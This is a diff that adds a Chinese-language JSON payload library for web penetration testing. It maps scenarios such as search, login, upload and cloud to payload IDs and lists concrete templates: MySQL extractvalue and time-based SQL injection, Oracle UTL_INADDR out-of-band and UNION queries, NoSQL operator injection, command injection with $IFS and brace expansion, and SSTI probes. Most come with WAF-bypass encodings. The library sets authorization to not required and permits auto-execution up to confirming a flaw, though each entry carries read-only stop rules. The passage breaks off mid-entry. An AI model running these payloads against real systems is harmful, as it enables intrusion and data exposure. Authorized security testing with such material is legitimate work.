@@ -1,0 +1,3973 @@
+{
+  "version": 2,
+  "updatedAt": "2026-10-30",
+  "sourcePolicy": {
+    "mode": "reference",
+    "requiresAuthorization": false,
+    "autoExecution": "confirm-and-stop",
+    "note": "report:* 来源已改为类别#哈希；guide/note 来源已改为类别标识；原始报告/指南文件名只保留在本地，不随知识库分发。高风险非破坏条目可自动执行到确认漏洞存在，destructive 条目仅人工复核。",
+    "desensitized": true
+  },
+  "scenarios": [
+    {
+      "id": "web-search",
+      "label": "搜索/列表/筛选",
+      "assetTypes": [
+        "web",
+        "miniprogram",
+        "app"
+      ],
+      "signals": [
+        "search",
+        "keyword",
+        "query",
+        "filter",
+        "list",
+        "total",
+        "筛选"
+      ],
+      "payloads": [
+        "sqli-es-or-total",
+        "sqli-mysql-error-like",
+        "sqli-mysql-time",
+        "sqli-postgres-time",
+        "xss-reflected-basic",
+        "xss-attribute-break",
+        "ssti-detect"
+      ]
+    },
+    {
+      "id": "web-login",
+      "label": "登录/认证/会话",
+      "assetTypes": [
+        "web",
+        "miniprogram",
+        "app"
+      ],
+      "signals": [
+        "login",
+        "auth",
+        "token",
+        "jwt",
+        "oauth",
+        "session",
+        "登录"
+      ],
+      "payloads": [
+        "jwt-none",
+        "jwt-weak-secret",
+        "jwt-kid-injection",
+        "auth-token-issuance",
+        "auth-empty-code",
+        "oauth-userid-swap",
+        "oauth-code-reuse",
+        "nosql-operator",
+        "csrf-form",
+        "framework-shiro-detect"
+      ]
+    },
+    {
+      "id": "web-upload",
+      "label": "文件上传/下载/预览",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "signals": [
+        "upload",
+        "file",
+        "download",
+        "attach",
+        "filename",
+        "上传"
+      ],
+      "payloads": [
+        "upload-frontend-bypass",
+        "upload-extension-bypass",
+        "upload-unauth",
+        "upload-sts-wildcard",
+        "path-traversal-basic",
+        "lfi-php-filter",
+        "xxe-classic"
+      ]
+    },
+    {
+      "id": "web-api-json",
+      "label": "JSON API / 前后端分离",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram",
+        "app"
+      ],
+      "signals": [
+        "json",
+        "api",
+        "rest",
+        "graphql",
+        "body",
+        "接口"
+      ],
+      "payloads": [
+        "sqli-mysql-error-like",
+        "sqli-mysql-time",
+        "sqli-postgres-time",
+        "idor-id-swap",
+        "bfla-method-swap",
+        "mass-assignment",
+        "graphql-introspection",
+        "prototype-pollution",
+        "info-leak-druid",
+        "info-leak-swagger",
+        "info-leak-nacos",
+        "framework-fastjson-detect",
+        "framework-shiro-detect"
+      ]
+    },
+    {
+      "id": "web-cloud",
+      "label": "云资产/对象存储/元数据",
+      "assetTypes": [
+        "web",
+        "cloud",
+        "api"
+      ],
+      "signals": [
+        "cloud",
+        "oss",
+        "s3",
+        "bucket",
+        "metadata",
+        "sts",
+        "iam"
+      ],
+      "payloads": [
+        "ssrf-cloud-metadata",
+        "ssrf-dnslog",
+        "ssrf-redirect-follow",
+        "upload-sts-wildcard",
+        "cloud-sts-policy",
+        "subdomain-takeover",
+        "cloud-sts-unicode-bypass"
+      ]
+    },
+    {
+      "id": "web-content",
+      "label": "富文本/评论/资料展示",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "signals": [
+        "comment",
+        "profile",
+        "nickname",
+        "richtext",
+        "富文本",
+        "评论"
+      ],
+      "payloads": [
+        "xss-stored",
+        "xss-reflected-basic",
+        "xss-attribute-break",
+        "xss-waf-bypass",
+        "xss-dom"
+      ]
+    },
+    {
+      "id": "web-redirect",
+      "label": "跳转/回调/分享",
+      "assetTypes": [
+        "web",
+        "miniprogram",
+        "app"
+      ],
+      "signals": [
+        "redirect",
+        "returnurl",
+        "callback",
+        "next",
+        "跳转"
+      ],
+      "payloads": [
+        "open-redirect",
+        "ssrf-dnslog",
+        "host-header-injection"
+      ]
+    },
+    {
+      "id": "web-infra",
+      "label": "网关/CDN/代理",
+      "assetTypes": [
+        "web"
+      ],
+      "signals": [
+        "gateway",
+        "cdn",
+        "proxy",
+        "host",
+        "cache",
+        "网关"
+      ],
+      "payloads": [
+        "api-gateway-path",
+        "http-smuggling-clte",
+        "http-smuggling-tecl",
+        "cache-poisoning-host",
+        "host-header-injection",
+        "info-leak-druid",
+        "info-leak-swagger",
+        "info-leak-nacos",
+        "framework-fastjson-detect",
+        "framework-shiro-detect"
+      ]
+    },
+    {
+      "id": "mobile-app",
+      "label": "App 移动端",
+      "assetTypes": [
+        "app"
+      ],
+      "signals": [
+        "android",
+        "ios",
+        "app",
+        "apk",
+        "ipa",
+        "模拟器"
+      ],
+      "payloads": [
+        "mobile-deeplink",
+        "idor-id-swap",
+        "oauth-userid-swap",
+        "auth-token-issuance",
+        "mobile-android-exported",
+        "mobile-android-webview",
+        "mobile-ios-ats",
+        "mobile-harmony-ability"
+      ]
+    },
+    {
+      "id": "mobile-webview",
+      "label": "App WebView/DeepLink",
+      "assetTypes": [
+        "app"
+      ],
+      "signals": [
+        "webview",
+        "deeplink",
+        "scheme",
+        "h5"
+      ],
+      "payloads": [
+        "mobile-deeplink",
+        "xss-reflected-basic",
+        "xss-dom",
+        "open-redirect",
+        "mobile-android-webview",
+        "mobile-ios-ats"
+      ]
+    },
+    {
+      "id": "miniprogram",
+      "label": "小程序",
+      "assetTypes": [
+        "miniprogram"
+      ],
+      "signals": [
+        "小程序",
+        "openid",
+        "wx",
+        "mini program"
+      ],
+      "payloads": [
+        "miniprogram-openid",
+        "sqli-mysql-error-like",
+        "idor-id-swap",
+        "auth-token-issuance"
+      ]
+    },
+    {
+      "id": "cloud-iam",
+      "label": "云账号/IAM/STS",
+      "assetTypes": [
+        "cloud",
+        "web"
+      ],
+      "signals": [
+        "iam",
+        "sts",
+        "role",
+        "policy",
+        "assumerole",
+        "权限"
+      ],
+      "payloads": [
+        "cloud-sts-policy",
+        "upload-sts-wildcard",
+        "ssrf-cloud-metadata",
+        "cloud-sts-unicode-bypass",
+        "cloud-hasura-admin",
+        "info-leak-nacos"
+      ]
+    },
+    {
+      "id": "graphql",
+      "label": "GraphQL",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "signals": [
+        "graphql",
+        "__schema",
+        "query"
+      ],
+      "payloads": [
+        "graphql-introspection",
+        "graphql-batch",
+        "idor-id-swap",
+        "cloud-hasura-admin"
+      ]
+    },
+    {
+      "id": "websocket",
+      "label": "WebSocket",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "signals": [
+        "websocket",
+        "ws",
+        "origin"
+      ],
+      "payloads": [
+        "websocket-origin"
+      ]
+    },
+    {
+      "id": "infra-http",
+      "label": "HTTP 协议层",
+      "assetTypes": [
+        "web"
+      ],
+      "signals": [
+        "smuggling",
+        "http2",
+        "cl.te",
+        "te.cl",
+        "协议"
+      ],
+      "payloads": [
+        "http-smuggling-clte",
+        "http-smuggling-tecl",
+        "cache-poisoning-host"
+      ]
+    },
+    {
+      "id": "deserialization",
+      "label": "反序列化/JNDI",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "signals": [
+        "deserialize",
+        "jndi",
+        "ldap",
+        "rmi",
+        "java"
+      ],
+      "payloads": [
+        "deserialization-java",
+        "jndi-lookup",
+        "framework-fastjson-detect",
+        "framework-shiro-detect"
+      ]
+    },
+    {
+      "id": "logic-payment",
+      "label": "业务逻辑/支付",
+      "assetTypes": [
+        "web",
+        "api",
+        "app",
+        "miniprogram"
+      ],
+      "signals": [
+        "price",
+        "amount",
+        "payment",
+        "coupon",
+        "order",
+        "支付",
+        "优惠券"
+      ],
+      "payloads": [
+        "logic-price-tamper",
+        "logic-coupon-reuse",
+        "race-condition"
+      ]
+    },
+    {
+      "id": "race",
+      "label": "并发/竞态",
+      "assetTypes": [
+        "web",
+        "api",
+        "app",
+        "miniprogram"
+      ],
+      "signals": [
+        "race",
+        "concurrent",
+        "parallel",
+        "并发"
+      ],
+      "payloads": [
+        "race-condition"
+      ]
+    }
+  ],
+  "payloads": [
+    {
+      "id": "sqli-mysql-error-like",
+      "category": "injection/sqli",
+      "title": "MySQL LIKE 上下文报错注入",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-search",
+        "web-api-json"
+      ],
+      "signals": [
+        "mysql",
+        "like",
+        "search",
+        "keyword",
+        "1064",
+        "xpath",
+        "报错"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-mysql-like-context",
+      "variants": [
+        {
+          "id": "clown-generic",
+          "source": "clown:injection-test.md#SQL注入",
+          "label": "通用引号/布尔/延时",
+          "template": "' AND (1)=(2)-- -",
+          "verify": "比较真假条件的状态码、长度或延时",
+          "score": 2,
+          "reason": "只给通用探针，缺少报错函数和 LIKE 闭合上下文"
+        },
+        {
+          "id": "report-mysql-like-context",
+          "source": "report:injection-sqli#c27d403a",
+          "label": "LIKE 闭合 + extractvalue 回显",
+          "template": "<PARAM>=<VALUE>' AND extractvalue(1,concat(0x7e,database())) AND '%'='%",
+          "verify": "回包出现 XPATH syntax error: '~<DB_NAME>'",
+          "score": 5,
+          "reason": "给出 LIKE 闭合、extractvalue 回显和对照包，实战可复现性最好"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "sqli-url-encode",
+          "technique": "URL 编码",
+          "template": "<PARAM>=<VALUE>%27%20AND%20extractvalue(1,concat(0x7e,database()))%20AND%20%27%25%27%3d%27%25",
+          "decodeSteps": [
+            "接收端执行一次 URL 解码",
+            "恢复原始 SQL 片段"
+          ],
+          "risk": "low",
+          "note": "只改变传输编码，不改变关键字和闭合结构。",
+          "applicableWhen": "已授权的只读库名/版本验证，且参数在业务逻辑前会做 URL 解码。"
+        },
+        {
+          "id": "sqli-double-url-encode",
+          "technique": "双重 URL 编码",
+          "template": "<PARAM>=<VALUE>%2527%2520AND%2520extractvalue(1%252cconcat(0x7e%252cdatabase()))%2520AND%2520%2527%2525%2527%253d%2527%2525",
+          "decodeSteps": [
+            "第一次解码得到单次编码形式",
+            "第二次解码恢复原始 SQL 片段"
+          ],
+          "risk": "low",
+          "note": "一次解码只还原到单次编码；用于识别重复解码。",
+          "applicableWhen": "已授权的只读验证，且确认中间件可能重复解码。"
+        },
+        {
+          "id": "sqli-comment-inline",
+          "technique": "SQL 行内注释插入 /**/",
+          "template": "<PARAM>=<VALUE>'/**/AND/**/extractvalue(1,concat(0x7e,database()))/**/AND/**/'%'='%",
+          "decodeSteps": [
+            "接收端忽略 /**/ 注释",
+            "SQL 关键字仍可读"
+          ],
+          "risk": "medium",
+          "note": "只插入注释，不改变关键字、函数和 LIKE 闭合。",
+          "applicableWhen": "已授权的 MySQL 只读库名验证。"
+        },
+        {
+          "id": "sqli-versioned-comment",
+          "technique": "MySQL 版本化注释 /*!50000...*/",
+          "template": "<PARAM>=<VALUE>'/*!50000AND*/extractvalue(1,concat(0x7e,database()))/*!50000AND*/'%'='%",
+          "decodeSteps": [
+            "MySQL 执行 /*!50000...*/ 内的关键字",
+            "恢复原始 AND 语义"
+          ],
+          "risk": "medium",
+          "note": "仅适用于 MySQL 版本化注释语义，其他数据库不按同样方式执行。",
+          "applicableWhen": "已授权的 MySQL 只读库名验证。"
+        },
+        {
+          "id": "sqli-case-mixed",
+          "technique": "SQL 关键字大小写混写",
+          "template": "<PARAM>=<VALUE>' AnD extractvalue(1,concat(0x7e,database())) AnD '%'='%",
+          "decodeSteps": [
+            "SQL 解析器按大小写不敏感识别关键字",
+            "恢复原始语义"
+          ],
+          "risk": "low",
+          "note": "关键字仍可读；只用于观察精确小写匹配规则。",
+          "applicableWhen": "已授权的 MySQL 只读库名验证。"
+        },
+        {
+          "id": "sqli-whitespace-tab",
+          "technique": "空白替代 %09",
+          "template": "<PARAM>=<VALUE>'%09AND%09extractvalue(1,concat(0x7e,database()))%09AND%09'%'='%",
+          "decodeSteps": [
+            "接收端把 %09 解码为制表符",
+            "SQL 解析器把制表符视为空白"
+          ],
+          "risk": "low",
+          "note": "只替换普通空格，保留关键字和闭合结构。",
+          "applicableWhen": "已授权的只读验证，且接收端会解码 %09。"
+        }
+      ],
+      "stop": "只做只读库名/版本验证；不读取业务表或真实用户数据；目标端点若含写入语义立即停止。"
+    },
+    {
+      "id": "sqli-mysql-error-from",
+      "category": "injection/sqli",
+      "title": "MySQL FROM 子查询别名报错注入",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "mysql",
+        "table-name",
+        "from",
+        "alias",
+        "xpath"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-mysql-from-alias",
+      "variants": [
+        {
+          "id": "clown-generic",
+          "source": "clown:injection-test.md#SQL注入",
+          "label": "通用单引号探针",
+          "template": "'",
+          "verify": "观察 1064 语法错误是否回显",
+          "score": 2,
+          "reason": "只能判断拼接，不能在被拼进表名的位置取数"
+        },
+        {
+          "id": "report-mysql-from-alias",
+          "source": "report:injection-sqli#0aa3c7b9",
+          "label": "空格别名 + 逗号子查询",
+          "template": "<TABLE_PARAM>=<TABLE> t,(SELECT extractvalue(1,concat(0x7e,version())))x",
+          "verify": "回包出现 XPATH syntax error: '~<VERSION>'",
+          "score": 5,
+          "reason": "解决表名位置不能直接加子查询的问题，给出合法 FROM 结构"
+        }
+      ],
+      "stop": "只验证版本/库名；不读取评论、账号、IP 等真实数据；不要对生产写接口重放。"
+    },
+    {
+      "id": "sqli-mysql-time",
+      "category": "injection/sqli",
+      "title": "MySQL 时间盲注（默认不自动发送）",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "web-search"
+      ],
+      "signals": [
+        "mysql",
+        "sleep",
+        "time",
+        "sort",
+        "order by",
+        "延时"
+      ],
+      "risk": "high",
+      "destructive": true,
+      "requiresConfirmation": true,
+      "selectedVariant": "report-mysql-time-context",
+      "variants": [
+        {
+          "id": "clown-sleep",
+          "source": "clown:injection-test.md#命令注入",
+          "label": "通用 SLEEP/BENCHMARK",
+          "template": "1' AND SLEEP(5)-- -",
+          "verify": "比较真假条件响应时间；基线至少 3 次",
+          "score": 3,
+          "reason": "有通用延时探针，但未给排序参数上下文"
+        },
+        {
+          "id": "report-mysql-time-context",
+          "source": "report:injection-sqli#7e0b2cca",
+          "label": "ORDER BY 排序参数条件延时",
+          "template": "DESC,(select if(1=1,sleep(2),0))",
+          "verify": "真条件延时约 2-3 秒，假条件立即返回；与基线对照",
+          "score": 5,
+          "reason": "给出排序参数注入位置、真假对照和响应时间判据"
+        }
+      ],
+      "stop": "默认不自动发送，需显式开启时间盲注；单次延时验证即可，不逐字符提取，不并发、不高频重放，异常即停。"
+    },
+    {
+      "id": "sqli-postgres-time",
+      "category": "injection/sqli",
+      "title": "PostgreSQL 时间盲注（默认不自动发送）",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "web-search"
+      ],
+      "signals": [
+        "postgres",
+        "postgresql",
+        "pg_sleep",
+        "time",
+        "延时"
+      ],
+      "risk": "high",
+      "destructive": true,
+      "requiresConfirmation": true,
+      "selectedVariant": "report-postgres-time-context",
+      "variants": [
+        {
+          "id": "clown-pg",
+          "source": "clown:waf-bypass.md#时间盲注",
+          "label": "pg_sleep 替代",
+          "template": "1' AND 1=(SELECT 1 FROM PG_SLEEP(5))-- -",
+          "verify": "比较真假条件响应时间",
+          "score": 3,
+          "reason": "只作为 WAF 绕过替代，缺少参数上下文"
+        },
+        {
+          "id": "report-postgres-time-context",
+          "source": "report:injection-sqli#e8d0cbd3",
+          "label": "字符串参数条件延时",
+          "template": "<PARAM>=0'+AND+1=(SELECT+1+FROM+PG_SLEEP(3))+AND+'a'='a",
+          "verify": "真条件延时约 3 秒，假条件正常返回",
+          "score": 5,
+          "reason": "给出 PostgreSQL 字符串闭合、条件延时与基线对照"
+        }
+      ],
+      "stop": "默认不自动发送，需显式开启时间盲注；只做单次条件延时，不提取数据，并发或连接池异常时立即停止。"
+    },
+    {
+      "id": "sqli-oracle-time",
+      "category": "injection/sqli",
+      "title": "Oracle 时间盲注（默认不自动发送）",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "oracle",
+        "dbms_pipe",
+        "receive_message",
+        "time",
+        "延时"
+      ],
+      "risk": "high",
+      "destructive": true,
+      "requiresConfirmation": true,
+      "selectedVariant": "report-oracle-pipe-context",
+      "variants": [
+        {
+          "id": "clown-none",
+          "source": "clown:injection-test.md#SQL注入",
+          "label": "无 Oracle 专用模板",
+          "template": "未提供",
+          "verify": "仅能靠通用引号/布尔判断",
+          "score": 0,
+          "reason": "clown 知识库没有 Oracle 时间盲注模板"
+        },
+        {
+          "id": "report-oracle-pipe-context",
+          "source": "report:injection-sqli#a97d0db1",
+          "label": "dbms_pipe 条件延时",
+          "template": "<PARAM>=Y' AND (CASE WHEN (1=1) THEN dbms_pipe.receive_message('a',3) ELSE 0 END)=0-- ",
+          "verify": "真条件延时约 3 秒，假条件正常返回",
+          "score": 5,
+          "reason": "给出 Oracle CASE + dbms_pipe 的完整条件延时结构"
+        },
+        {
+          "id": "report-oracle-pipe-direct",
+          "source": "report:injection-sqli#84605365",
+          "label": "dbms_pipe 直接调用",
+          "template": "xlsjly=select+dbms_pipe.receive_message('a',5)+from+dual",
+          "verify": "响应延时约 5 秒",
+          "score": 4,
+          "reason": "更短，但依赖参数可直接执行 SELECT"
+        }
+      ],
+      "stop": "默认不自动发送，需显式开启时间盲注；只做单次延时，不提取数据，DBMS_PIPE 可能影响会话，异常即停。"
+    },
+    {
+      "id": "sqli-oracle-error",
+      "category": "injection/sqli",
+      "title": "Oracle 报错/带外注入",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "oracle",
+        "utl_inaddr",
+        "sys_context",
+        "dual",
+        "报错"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-oracle-utl-oob",
+      "variants": [
+        {
+          "id": "clown-none",
+          "source": "clown:injection-test.md#SQL注入",
+          "label": "无 Oracle 专用模板",
+          "template": "未提供",
+          "verify": "仅能靠通用布尔判断",
+          "score": 0,
+          "reason": "clown 知识库没有 Oracle 报错/带外模板"
+        },
+        {
+          "id": "report-oracle-utl-oob",
+          "source": "report:injection-sqli#ca66b8b6",
+          "label": "UTL_INADDR 带外解析",
+          "template": "' and 1=UTL_INADDR.GET_HOST_NAME((select SYS_CONTEXT('USERENV','DB_NAME') from dual)) and '1%'='1",
+          "verify": "DNS/HTTP 回调出现库名；或回包报错含库名",
+          "score": 5,
+          "reason": "给出 Oracle 带外函数和闭合方式"
+        },
+        {
+          "id": "report-oracle-syscontext",
+          "source": "report:injection-sqli#84605365",
+          "label": "SYS_CONTEXT 布尔",
+          "template": "xlsjly=SELECT+1+FROM+DUAL+WHERE+SYS_CONTEXT('USERENV','DB_NAME')='<DB_NAME>'",
+          "verify": "真假条件回包差异",
+          "score": 4,
+          "reason": "适合已知库名时的布尔验证"
+        }
+      ],
+      "stop": "带外只用自己的回调域名；不读取业务数据；UTL_INADDR 可能触发 DNS 解析，异常时停止。"
+    },
+    {
+      "id": "sqli-generic-boolean",
+      "category": "injection/sqli",
+      "title": "通用 SQL 布尔差分",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-search",
+        "web-api-json"
+      ],
+      "signals": [
+        "sql",
+        "boolean",
+        "真",
+        "假",
+        "差异",
+        "quote"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-boolean",
+      "variants": [
+        {
+          "id": "clown-boolean",
+          "source": "clown:injection-test.md#SQL注入",
+          "label": "布尔假/真 + 只打一枪",
+          "template": "')and (1)=(2)-- -  →  1')or (1)=(1)-- +A",
+          "verify": "先假后真；只比较状态码、长度、total 或错误类别",
+          "score": 5,
+          "reason": "明确“先假后真、只打一枪”的节奏，副作用控制最好"
+        },
+        {
+          "id": "report-generic",
+          "source": "report:injection-sqli#e8d0cbd3",
+          "label": "and 1=1 / 1=2",
+          "template": "id=1 and 1=1  →  id=1 and 1=2",
+          "verify": "正常/异常页面差异",
+          "score": 3,
+          "reason": "经典但容易触发全表扫描，缺少节奏约束"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "sqli-url-encode",
+          "technique": "URL 编码",
+          "template": "id=1%27%20AND%20(1)=(1)--%20-",
+          "decodeSteps": [
+            "接收端执行一次 URL 解码",
+            "恢复原始布尔探针"
+          ],
+          "risk": "low",
+          "note": "只改变传输编码，保留真假条件。",
+          "applicableWhen": "已授权的只读布尔差分验证。"
+        },
+        {
+          "id": "sqli-double-url-encode",
+          "technique": "双重 URL 编码",
+          "template": "id=1%2527%2520AND%2520(1)=(1)--%2520-",
+          "decodeSteps": [
+            "第一次解码得到单次编码形式",
+            "第二次解码恢复原始布尔探针"
+          ],
+          "risk": "low",
+          "note": "一次解码只还原到单次编码；用于识别重复解码。",
+          "applicableWhen": "已授权的只读布尔差分验证。"
+        },
+        {
+          "id": "sqli-comment-inline",
+          "technique": "SQL 行内注释插入 /**/",
+          "template": "id=1'/**/AND/**/(1)=(1)-- -",
+          "decodeSteps": [
+            "接收端忽略 /**/ 注释",
+            "AND 关键字仍可读"
+          ],
+          "risk": "medium",
+          "note": "只插入注释，不改变真假条件。",
+          "applicableWhen": "已授权的只读布尔差分验证。"
+        },
+        {
+          "id": "sqli-versioned-comment",
+          "technique": "MySQL 版本化注释 /*!50000...*/",
+          "template": "id=1'/*!50000AND*/(1)=(1)-- -",
+          "decodeSteps": [
+            "MySQL 执行版本化注释内的 AND",
+            "恢复原始真假条件"
+          ],
+          "risk": "medium",
+          "note": "仅适用于 MySQL 版本化注释语义。",
+          "applicableWhen": "已授权的 MySQL 只读布尔差分验证。"
+        },
+        {
+          "id": "sqli-whitespace-plus",
+          "technique": "空白替代 +",
+          "template": "id=1'+AND+(1)=(1)--+-",
+          "decodeSteps": [
+            "接收端按表单编码把 + 还原为空格",
+            "SQL 解析器继续解析"
+          ],
+          "risk": "low",
+          "note": "只适用于会按表单编码解码 + 的接收端。",
+          "applicableWhen": "已授权的只读布尔差分验证，参数为表单编码。"
+        }
+      ],
+      "stop": "不做 OR 恒真长时间重放；不翻页、不导出；出现慢查询或连接池告警立即停止。"
+    },
+    {
+      "id": "sqli-es-or-total",
+      "category": "injection/sqli",
+      "title": "列表筛选 OR + total 差分类注入",
+      "assetTypes": [
+        "web",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-search"
+      ],
+      "signals": [
+        "total",
+        "totalsize",
+        "es",
+        "list",
+        "筛选",
+        "employeeName"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-es-total",
+      "variants": [
+        {
+          "id": "clown-es-total",
+          "source": "clown:injection-test.md#列表筛选项 OR + total",
+          "label": "OR 恒真 + 只看 total",
+          "template": "1')or (1)=(1)-- +A",
+          "verify": "total 从 0/个位涨到海量即停；不翻页、不导出",
+          "score": 5,
+          "reason": "唯一覆盖 ES/列表 total 差异的模板，且明确只打一枪"
+        }
+      ],
+      "stop": "只打一枪；pageSize 保持 1-5；不翻页、不导出、不用 sqlmap dump；集群告警立即停止。"
+    },
+    {
+      "id": "sqli-oracle-union",
+      "category": "injection/sqli",
+      "title": "Oracle UNION 查询",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json"
+      ],
+      "signals": [
+        "oracle",
+        "union",
+        "dual",
+        "column"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "report-oracle-union-context",
+      "variants": [
+        {
+          "id": "clown-union",
+          "source": "clown:waf-bypass.md#UNION SELECT",
+          "label": "通用 UNION 变体",
+          "template": "UNION ALL SELECT 1,2,3-- -",
+          "verify": "观察列数/回显位置",
+          "score": 3,
+          "reason": "只给通用变体，未覆盖 Oracle dual"
+        },
+        {
+          "id": "report-oracle-union-context",
+          "source": "report:injection-sqli#ca66b8b6",
+          "label": "Oracle dual + SYS_CONTEXT",
+          "template": "' union select SYS_CONTEXT('USERENV','DB_NAME'),999,'dbname2','','','' from dual where '1%'='1",
+          "verify": "回包出现库名/固定标记",
+          "score": 5,
+          "reason": "给出 Oracle 列数、dual 和字符串闭合"
+        }
+      ],
+      "stop": "只验证库名/固定标记；不批量取数；列数不符时停止，不要暴力扩列。"
+    },
+    {
+      "id": "nosql-operator",
+      "category": "injection/nosql",
+      "title": "MongoDB/NoSQL 操作符注入",
+      "assetTypes": [
+        "web",
+        "api",
+        "miniprogram"
+      ],
+      "scenarios": [
+        "web-login",
+        "web-api-json"
+      ],
+      "signals": [
+        "mongo",
+        "nosql",
+        "json",
+        "$ne",
+        "$gt",
+        "登录"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-nosql",
+      "variants": [
+        {
+          "id": "clown-nosql",
+          "source": "clown:injection-test.md#JSON / Mongo 操作符",
+          "label": "JSON 操作符 / 表单数组",
+          "template": "{\"$ne\":\"\"} / {\"$gt\":\"\"} / password[$ne]=x",
+          "verify": "登录成功或返回主体与基线不同",
+          "score": 5,
+          "reason": "覆盖 JSON 与 form 两种传参，且提醒登录框不当业务参"
+        }
+      ],
+      "stop": "只用自己的测试账号；不枚举真实账号；登录成功即停，不继续取数。"
+    },
+    {
+      "id": "command-injection",
+      "category": "injection/command",
+      "title": "命令注入无害探针",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-api-json",
+        "web-search"
+      ],
+      "signals": [
+        "command",
+        "ping",
+        "ip",
+        "filename",
+        "diagnostic",
+        "命令"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-command",
+      "variants": [
+        {
+          "id": "clown-command",
+          "source": "clown:injection-test.md#命令注入",
+          "label": "分号/管道/子命令（只读）",
+          "template": ";id / |id / $(id) / `id`",
+          "verify": "回包出现 id/whoami 等只读命令输出；与基线对照",
+          "score": 5,
+          "reason": "只读命令探针；禁止 sleep/ping flood，不反弹 shell、不写文件"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "cmd-semicolon",
+          "technique": "分号分隔",
+          "template": ";id",
+          "decodeSteps": [
+            "接收端把分号视为命令分隔符",
+            "执行只读 id 探针"
+          ],
+          "risk": "medium",
+          "note": "只使用 id/whoami 等只读探针。",
+          "applicableWhen": "已授权的只读命令注入验证。"
+        },
+        {
+          "id": "cmd-pipe",
+          "technique": "管道分隔",
+          "template": "|id",
+          "decodeSteps": [
+            "接收端把管道视为命令连接符",
+            "执行只读 id 探针"
+          ],
+          "risk": "medium",
+          "note": "只使用只读探针；不接下载、写入或反弹命令。",
+          "applicableWhen": "已授权的只读命令注入验证。"
+        },
+        {
+          "id": "cmd-and",
+          "technique": "逻辑与分隔",
+          "template": "&&id",
+          "decodeSteps": [
+            "接收端把 && 视为命令连接符",
+            "执行只读 id 探针"
+          ],
+          "risk": "medium",
+          "note": "只使用只读探针；不接下载、写入或反弹命令。",
+          "applicableWhen": "已授权的只读命令注入验证。"
+        },
+        {
+          "id": "cmd-newline",
+          "technique": "换行分隔 %0a",
+          "template": "%0aid",
+          "decodeSteps": [
+            "接收端把 %0a 解码为换行",
+            "shell 把换行视为命令分隔符"
+          ],
+          "risk": "medium",
+          "note": "只使用只读探针；不接下载、写入或反弹命令。",
+          "applicableWhen": "已授权的只读命令注入验证。"
+        },
+        {
+          "id": "cmd-ifs",
+          "technique": "$IFS 空白替代",
+          "template": ";cat$IFS<FILE>",
+          "decodeSteps": [
+            "shell 把 $IFS 展开为空白",
+            "恢复为 cat <FILE> 并只读输出"
+          ],
+          "risk": "medium",
+          "note": "只用于 cat <FILE> 等只读文件探针，不包含写入或删除。",
+          "applicableWhen": "已授权的只读文件探针。"
+        },
+        {
+          "id": "cmd-brace-expansion",
+          "technique": "{cat,<FILE>} 花括号展开",
+          "template": ";{cat,<FILE>}",
+          "decodeSteps": [
+            "shell 把 {cat,<FILE>} 展开为 cat <FILE>",
+            "只读文件内容"
+          ],
+          "risk": "medium",
+          "note": "只用于只读文件探针，不包含写入、删除或持久化。",
+          "applicableWhen": "已授权的只读文件探针。"
+        }
+      ],
+      "stop": "只用 id/whoami 等只读命令；禁止 sleep、ping flood、循环压测；不写文件、不反弹 shell、不读业务数据。"
+    },
+    {
+      "id": "ssti-detect",
+      "category": "injection/ssti",
+      "title": "SSTI 引擎探测",
+      "assetTypes": [
+        "web",
+        "api"
+      ],
+      "scenarios": [
+        "web-search",
+        "web-api-json"
+      ],
+      "signals": [
+        "template",
+        "ssti",
+        "jinja",
+        "twig",
+        "freemarker",
+        "渲染"
+      ],
+      "risk": "medium",
+      "destructive": false,
+      "requiresConfirmation": false,
+      "selectedVariant": "clown-ssti-detect",
+      "variants": [
+        {
+          "id": "clown-ssti-detect",
+          "source": "clown:injection-test.md#SSTI",
+          "label": "多引擎算术探测",
+          "template": "{{7*7}} / ${7*7} / <%= 7*7 %> / #{7*7} / *{7*7}",
+          "verify": "回包出现 49 或对应引擎的错误差异",
+          "score": 5,
+          "reason": "覆盖 Jinja2/Twig/FreeMarker/ERB/Thymeleaf"
+        }
+      ],
+      "bypassVariants": [
+        {
+          "id": "ssti-url-encode",
+          "technique": "URL 编码",
+          "template": "%7b%7b7%2a7%7d%7d",
+          "decodeSteps": [
+            "接收端执行一次 URL 解码",
